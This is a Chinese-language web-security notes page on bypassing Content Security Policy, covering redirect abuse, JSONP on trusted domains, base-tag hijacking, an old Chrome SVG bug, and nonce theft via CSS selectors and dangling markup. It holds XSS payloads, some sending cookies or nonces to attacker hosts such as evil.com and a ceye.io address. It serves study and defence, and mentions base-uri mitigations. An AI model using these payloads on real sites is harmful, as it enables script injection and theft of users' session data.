categories:
- web
title: bypass_csp
---
# bypass csp

内容安全策略  ([CSP](https://developer.mozilla.org/zh-CN/docs/Glossary/CSP)) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 ([XSS](https://developer.mozilla.org/en-US/docs/Glossary/XSS)) 和数据注入攻击等。无论是数据盗取、网站内容污染还是散发恶意软件，这些攻击都是主要的手段。 

## csp语法

CSP的特点就是他是在浏览器层面做的防护，是和同源策略同一级别，除非浏览器本身出现漏洞，否则不可能从机制上绕过。

CSP只允许被认可的JS块、JS文件、CSS等解析，只允许向指定的域发起请求。

https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP

https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy

[`default-src`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src) :在其他资源类型没有符合自己的策略时应用该策略(有关完整列表查看[`default-src`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src) )

![image773](https://images.seebug.org/content/images/2017/10/7b7e1d4c-9d9a-4bd0-ae6d-f266871fa300.png-w331s)

![image878](https://images.seebug.org/content/images/2017/10/c5a45eca-7e0c-4ebf-8143-712e4594f2fd.png-w331s)



###  strict-dynamic

` script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none';  `

script-src 中 strict-dynamic 中的作用:

- 丢弃白名单
- 允许执行js生成的js代码，例如：document.createElement('script') 
- 使  nonce-only CSPs  可以工作

![image1216](https://raw.githubusercontent.com/Explorersss/photo/master/20200520164256.png)



### 一些注意点

`https://cdn.com/*`只能匹配`https://cdn.com/*`



## bypass

### csp策略不完全导致的绕过





### 利用302跳转

` Content-Security-Policy: default-src 'self '; script-src http://127.0.0.1/static/`

如果可信域内存在一个可控的重定向文件，那么CSP的目录限制就可以被绕过。 

假设static目录下存在一个302文件

```
Static/302.php

<?php Header("location: ".$_GET['url'])?>
```

像刚才一样，上传一个test.jpg 然后通过302.php跳转到upload目录加载js就可以成功执行

```
<script src="static/302.php?url=upload/test.jpg">
```



### 绕过域限制的一些tricks

`Content-Security-Policy: default-src 'self'; script-src 'self'`

```html
<link rel="prefetch" href="http://lorexxar.cn"> (H5预加载)(only chrome)
<link rel="dns-prefetch" href="http://lorexxar.cn"> （DNS预加载）
<meta http-equiv="refresh" content="5;http://lorexxar.cn?c=[cookie]">
```



### 利用可信域的资源绕过

很多网站都会将google,baidu......添加到可信域里面，而如果里面存在可控的输出我们便可以绕过csp

常用可控jsonp: https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180 



### bypass nonce

#### 利用`<base>`标签

Specify a default URL and a default target for all links on a page:

```html
<head>
  <base href="https://www.evil.com/" target="_blank">
</head>

<body>
<img src="images/stickman.gif" width="24" height="39" alt="Stickman"><!-- load  https://www.evil.com/images/stickman.gif -->
<a href="tags/tag_base.asp">HTML base Tag</a>
</body><!-- point to https://www.evil.com/tags/tag_base.asp -->
```

因此我们可以设置个`<base>`标签，将相对路径导向恶意的网站

```html
<!-- XSS -->
<base href="https://evil.com/">
<!-- End XSS -->
…
<script src="foo/bar.js" nonce="r4nd0m"></script>
```



https://evil.com/foo/bar.js

```
alert(0000);
```

成功执行



防御方式：

在csp中添加：base-uri 'none' 或 base-uri 'self'

#### 利用chrome bug 来修改script src的值

```html
<!-- XSS -->
<svg><set href="victim" attributeName="href" to="data:,alert(1)" />
<!-- End XSS -->
…
<script id="victim" src="foo.js" nonce="r4nd0m"></script>
```

SVG中的set标签可以修改其他标签的属性值

该漏洞在chrome58中修复

#### steal nonce

#####  via CSS selectors



```html
<!-- XSS -->
<style>
script { display: block }
script[nonce^="a"]:after { content: url("record?a") }
script[nonce^="b"]:after { content: url("record?b") }
</style>
<!-- End XSS -->
<script src="foo/bar.js" nonce="r4nd0m"></script>
```

可以联合其他标签来发出请求，如`<a>` ...

```html
<style>script[nonce^="0"]~a{background:url("http://y5pwcd.ceye.io/success")}</style>
```

相关的css 语法

 https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors 

 https://developer.mozilla.org/zh-CN/docs/Web/CSS/Attribute_selectors 





#####  via dangling markup attack

破坏原有的结构，将script标签变成文本，诱使用户点击

```html
<!-- XSS --> <form method="post" action="//evil.com/form">
<input type="submit" value="click"><textarea name="nonce">
<!-- End XSS -->
<script src="foo/bar.js" nonce="r4nd0m"></script>
```



###  JS framework-based CSP Bypasses

利用低版本JQuery等js框架漏洞来绕过csp



## 绕过实例





## 一些工具

检查csp: https://csp-evaluator.withgoogle.com/ 

常用可控jsonp: https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180 

[csp mitigator](https://chrome.google.com/webstore/detail/csp-mitigator/gijlobangojajlbodabkpjpheeeokhfa) :一个csp调试工具





## 参考文章

 [Spagnuolo_Hack In Bo - So we broke all CSPs... You won't guess what happened next!](https://www.hackinbo.it/slides/1494231338_Spagnuolo_Hack In Bo - So we broke all CSPs... You won't guess what happened next!.pdf) 

[前端防御从入门到弃坑--CSP变迁](https://paper.seebug.org/423/)







## 收藏





Bypassing CSP script nonces via the browser cache： http://sebastian-lekies.de/csp/attacker.php

 https://hurricane618.me/2018/06/30/csp-bypass-summary/ 



 https://www.netsparker.com/blog/web-security/private-data-stolen-exploiting-css-injection/ 

 https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense 

 https://storage.googleapis.com/pub-tools-public-publication-data/pdf/45542.pdf 